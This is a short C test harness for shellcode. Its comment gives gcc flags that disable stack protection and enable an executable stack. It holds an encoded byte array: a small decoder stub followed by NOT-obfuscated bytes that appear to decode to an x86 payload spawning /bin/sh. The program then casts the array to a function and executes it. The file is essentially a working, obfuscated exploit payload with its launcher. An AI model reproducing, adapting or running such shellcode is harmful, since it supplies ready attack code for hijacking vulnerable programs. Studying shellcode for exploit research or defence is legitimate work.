/*
A simple program to test shellcode
gcc -fno-stack-protector -z execstack tshell.c
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\xeb\x0c\x5b\x31\xc9\xb1\x13\xf6\x13\x43\xe2\xfb\xeb\x05\xe8\xef\xff\xff\xff\xce"
"\x3f\xaf\x97\xd0\xd0\x8c\x97\x97\xd0\x9d\x96\x91\x4f\xf4\x76\x1c\x32\x7f";

main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

